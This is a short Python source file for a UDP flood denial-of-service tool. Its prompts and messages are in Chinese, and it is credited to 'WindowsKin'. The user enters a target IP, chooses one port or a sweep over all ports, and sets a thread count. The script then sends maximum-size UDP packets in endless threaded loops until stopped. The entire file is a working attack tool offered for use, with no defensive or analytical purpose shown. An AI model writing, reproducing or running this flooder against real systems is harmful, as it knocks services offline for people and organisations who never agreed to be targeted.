from socket import socket , AF_INET , SOCK_DGRAM
from threading import Thread
from os import system , name
from time import sleep

condition = True
bytes = bytes([0xFF] * 65507)
sock = socket(AF_INET , SOCK_DGRAM)

def is_valid_ipv4(ip):
    parts = ip.split('.')
    if len(parts)!= 4:
        return False
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except ValueError:
            return False
    return True
if name == "nt":
    def clear_shell():
        system("cls")
else:
    def clear_shell():
        system("clear")

clear_shell()
print("""
Python3  dos工具

作者          : WindowsKin
""")
while True:
    ip = input("请输入 IP : ")
    if not is_valid_ipv4(ip):
        print("检测到你输入了无效内容，请重新输入")
        sleep(2)
        continue
    break
mode = input("""
1.攻击指定端口
2.攻击所有端口
请输入攻击方式 : """)
if mode == "1":
    while True:
        try:
            port = int(input("请输入 端口 : "))
            if port > 65535 or port < 0:
                print("检测到你输入了无效内容，请重新输入")
                sleep(2)
                continue
        except ValueError:
            print("检测到你输入了无效内容，请重新输入")
            sleep(2)
        else:
            break
elif mode != "2":
    print('检测到你输入了无效内容，已以为你选择默认值"2"')
    sleep(2)
    mode = "2"
try:
    sc = int(input("请输入 线程数量(不能为0) : "))
    if sc == 0:
        print('检测到你输入了无效内容，已以为你选择默认值"1"')
        sleep(2)
        sc = 1
except ValueError:
    print('检测到你输入了无效内容，已以为你选择默认值"1"')
    sleep(2)
    sc = 1
clear_shell()

if mode == "1":
    print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip} {port} 端口")
elif mode == "2":
    print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip}")

def dos_1(bytes , ip , port):
    global condition
    while condition:
        try:
            sock.sendto(bytes , (ip , port))
        except:
            pass

def dos_2(bytes , ip):
    global condition
    port = 4444
    while condition:
        try:
            sock.sendto(bytes , (ip , port))
            if port == 65535:
                port = 0
            else:
                port += 1
        except:
            pass

if mode == "1":
    for i in range(sc):
        dos_sc = Thread(target = dos_1 , args = (bytes , ip , port))
        dos_sc.start()
elif mode == "2":
    for i in range(sc):
        dos_sc = Thread(target = dos_2 , args = (bytes , ip))
        dos_sc.start()

input("按Enter键停止攻击")
condition = False